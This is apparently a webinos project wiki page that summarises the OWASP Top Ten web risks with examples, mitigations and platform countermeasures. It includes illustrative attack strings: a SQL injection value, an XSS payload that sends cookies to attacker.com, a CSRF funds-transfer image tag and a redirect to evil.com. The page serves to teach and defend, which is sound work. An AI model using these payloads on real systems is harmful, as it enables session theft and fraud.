Threats OWASP
=============

OWASP
-----

OWASP (Open Web Application Security Project) is well-known, worldwide, non-profit organization; its purpose is to develop instruments to understand application security. OWASP’s definition of application security is _everything involved in developing, maintaining, and purchasing applications that your organization can trust_ ([[Deliverable_References#OWASP|OWASP]]).

OWASP supports tools for:

-   application security testing,
-   secure software development guidance,
-   advice on the use of application security APIs,
-   cheat sheets to avoid common application security holes,
-   information about common vulnerabilities,
-   taxonomies of threats and threat agents.

As part of the OWASP project, the most relevant security risks are highlighted and discussed, in the OWASP Top Ten 10 Most Critical Web Application Security Risks. These risks are described and detailed below. These risks can be mitigated or avoided adopting secure programming practice and properly shaped APIs. The "OWASP ESAPI (Enterprise Security API) project":https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API addresses the problem of properly shaped functions to mitigate most treacherous application security weaknesses, and describes [[OWASP_ESAPI|what kind of API is required to counteract each threat]] in the top ten.

A1 - Injection
--------------

It occurs when untrusted data is sent to an interpreter as part of a command or query

### example

String query = "SELECT * FROM accounts WHERE custID=‘" + request.getParameter("id") *"’";

The attacker modifies the â€˜idâ€™ parameter in their browser
http://example.com/app/accountView?id=’ or ’1’=’1

h3. OWASP suggested solutions:

# to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface
# carefully escape special characters using the specific escape syntax for that interpreter
# positive or â€œwhite listâ€ input validation with appropriate canonicalization

h3. Webinos relevance

it could be relevant when a webinos device exports some app or functionality

h3. Webinos suggested countermeasure

# secure code best practices should be adopted by webinos developers
# webinos applications should be tested with a defined patterns of improperly formatted input data


h2. A2 â€“ Cross-Site Scripting (XSS)

it occurs whenever an application takes untrusted data and sends them to a web browser without proper validation and/or escaping

h3. example

(String) page*= "<input name=’creditcard’ type=‘TEXTâ€˜ value=’" + request.getParameter("CC") + "‘>";

The attacker modifies the â€˜CCâ€™ parameter in their browser to:
’><script>document.location=‘http://www.attacker.com/cgi-bin/cookie.cgi?foo=’+document.cookie</script>’

### OWASP suggested solutions

1.  to properly escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into
2.  positive or â€œwhitelistâ€ input validation, but is not a complete defense as many applications must accept special characters
3.  Consider employing Mozilla’s new Content Security Policy (Firefox 4) to defend against XSS

### Note

Mozilla’s Content Security Policy (from https://developer.mozilla.org/en/Security/CSP/Using_Content_Security_Policy)
is a worth thing to analize, [[MozillaSecPolicy|some examples]] clarify what can provide

### Webinos relevance

It can enable improper cross-application injection and data access. Webinos could try to diminish impact of this

### Webinos suggested countermeasure

1.  secure code best practices should be adopted by webinos developers
2.  webinos applications should be tested with a defined patterns of improperly formatted input data
3.  webinos runtime could support Mozilla’s Content Security Policy

A3 - Broken Authentication and Session Management
-------------------------------------------------

application functions related to authentication and session management are often not implemented correctly

### example

http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii

He e-mails the above link without knowing he is also giving away his session ID

Applicationâ€™s timeouts arenâ€™t set properly. User uses a public computer to access site. Instead of selecting â€œlogoutâ€ the user simply closes the browser tab and walks away

User passwords are not encrypted, exposing every usersâ€™ password to the attacker.

### OWASP suggested solutions

1.  a single set of strong authentication and session management controls
    1.  meet all the authentication and session management requirements defined in OWASPâ€™s Application Security Verification Standard (ASVS) areas V2 (Authentication) and V3 (Session Management)
    2.  have a simple interface for developers. Consider the ESAPI Authenticator and User APIs as good examples
        to emulate, use, or build upon.

1.  avoid XSS flaws which can be used to steal session IDs. See A2

### Webinos relevance

authentication and session management problems can let an attacker to pose as a webinos legitimate user

### Webinos suggested countermeasure

1.  Webinos developer should correctly implement application functions related to authentication and session management
2.  have a simple interface for developers

### A4 - Insecure Direct Object References

It occurs when a developer exposes a reference to an internal implementation object

### example

String query = "SELECT * FROM accts WHERE account = ?";
PreparedStatement pstmt = connection.prepareStatement(query , … );
pstmt.setString( 1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

The attacker simply modifies the â€˜acctâ€™ parameter in their browser to send whatever account number they want

http://example.com/app/accountInfo?acct=notmyacct

### OWASP suggested solutions

1.  use per user or session indirect object references
2.  check access

### Webinos relevance:

similar to A1

### Webinos suggested countermeasure

provide developers with simple check access mechanisms

### A5 - Cross-Site Request Forgery (CSRF)

forces the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.

### example

<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#â€œwidth="0" height="0" />

### OWASP suggested solutions

The inclusion of a unpredictable token in the body or URL of each HTTP request. Such tokens should at a minimum be unique per user session, but can also be unique per request.
# include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request
# include the unique token in the URL itself, or a URL parameter. However, such placement runs the risk that the URL will be exposed to an attacker, thus compromising the secret token.

### Webinos relevance

an attacker can generate requests posing as a legitimate webinos user

### Webinos suggested countermeasure

Webinos developer should include an unpredictable token in each request

### A6 - Security Misconfiguration

good security requires having a secure configuration defined and deployed

### example

you don’t update your libraries

the app server admin console is automatically installed and not removed. Default accounts aren’t changed

directory listing is not disabled on your server

app server configuration allows stack traces to be returned to users

### OWASP suggested solutions

1.  a repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down
2.  a process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment
3.  a strong application architecture that provides good separation and security between components
4.  run scans and do audits periodically to help detect future misconfigurations or missing patches.

### Webinos relevance

an attacker can take advantage of a misconfiguration and exploit some vulnerability

### Webinos suggested countermeasure

1.  provide developers with means to easily write clear policies
2.  make mandatory the use of policies (and provide a default policy)

A7 - Insecure Cryptographic Storage
-----------------------------------

many web applications do not properly protect sensitive data

### example

the database is set to automatically decrypt queries against the credit card columns, allowing an SQL injection flaw to retrieve all the credit cards in cleartext

a backup tape is made of encrypted health records, but the encryption key is on the same backup

the password database uses unsalted hashes to store everyone’s passwords

### OWASP suggested solutions

1.  Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all such data at rest in a manner that defends against these threats
2.  Ensure offsite backups are encrypted, but the keys are managed and backed up separately
3.  Ensure appropriate strong standard algorithms and strong keys are used, and key management is in place
4.  Ensure passwords are hashed with a strong standard algorithm and an appropriate salt is used
5.  Ensure all keys and passwords are protected from unauthorized access

### Webinos relevance

an attacker can access sensitive data

### Webinos suggested countermeasure

1.  provide developers with means to easily encrypt data
2.  automatically use encrypted storage for apps (every app should have its own encrypted storage)

A8 - Failure to Restrict URL Access
-----------------------------------

applications need to perform access control checks each time protected pages are accessed

### example

http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

### OWASP suggested solutions

Preventing unauthorized URL access requires selecting an approach for requiring proper authentication and proper authorization for each page
# the authentication and authorization policies be role based, to minimize the effort required to maintain these policies
# the policies should be highly configurable, in order to minimize any hard coded aspects of the policy
# the enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific users and roles for access to every page.
# if the page is involved in a workflow, check to make sure the conditions are in the proper state to allow access

### Webinos relevance

an attacker could access protected pages

### Webinos suggested countermeasure

webinos PEP should check page accesses using suitable policies

A9 - Insufficient Transport Layer Protection
--------------------------------------------

applications frequently fail to authenticate, encrypt, and protect the confidentiality and integrity of sensitive network traffic

### example

a site simply doesn’t use SSL for all pages that require authentication

a site has improperly configured SSL certificate which causes browser warnings for its users. This causes users to get accustomed to such warnings

a site simply uses standard ODBC/JDBC for the database connection, not realizing all traffic is in the clear

### OWASP suggested solutions

1.  require SSL for all sensitive pages. Non-SSL requests to these pages should be redirected to the SSL page
2.  set the â€˜secureâ€™ flag on all sensitive cookies.
3.  configure your SSL provider to only support strong algorithms
4.  ensure your certificate is valid, not expired, not revoked, and matches all domains used by the site
5.  backend and other connections should also use SSL or other encryption technologies.

### Webinos relevance

an attacker may steal sensitive data from unprotected traffic

### Webinos suggested countermeasure

use policies requesting encryption, when advisable

A10 - Unvalidated Redirects and Forwards
----------------------------------------

web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages

### example

the attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware
http://www.example.com/redirect.jsp?url=evil.com

the attacker crafts a URL that will pass the application’s access control check and then forward the attacker to an administrative function that she would not normally be able to access
http://www.example.com/boring.jsp?fwd=admin.jsp

### OWASP suggested solutions

1.  avoid using redirects and forwards
2.  if used, don’t involve user parameters in calculating the destination
3.  if destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user. It is recommended that any such destination parameters be a mapping value, and that server side code translate this mapping to the target URL.

### Webinos relevance

an attacker can hijack the user

### Webinos suggested countermeasure

1.  secure code best practices should be adopted by webinos developers
2.  webinos applications should be tested with a defined patterns of improperly formatted input data

2007: A3 - Malicious File Execution.
------------------------------------

code vulnerable to remote file inclusion (RFI) allows attackers to include hostile code and data

### example

include $_REQUEST[’filenameâ€™];

### OWASP suggested solutions

1.  use an indirect object reference map
2.  use explicit taint checking mechanisms, if your language supports it
3.  strongly validate user input using "accept known good" as a strategy
4.  add firewall rules to prevent web servers making new connections to external web sites and internal systems
5.  check user supplied files or filenames
6.  consider implementing a chroot jail or other sand box mechanisms

### Webinos relevance

an attacker can execute malicious code

1.  secure code best practices should be adopted by webinos developers
2.  use policies to prevent web servers making new connections to external web sites and internal systems
3.  use sand box mechanisms

2007: A6 - Information Leakage and Improper Error Handling.
-----------------------------------------------------------

Proper configuration of error handling is a big part of securely configuring your application and servers
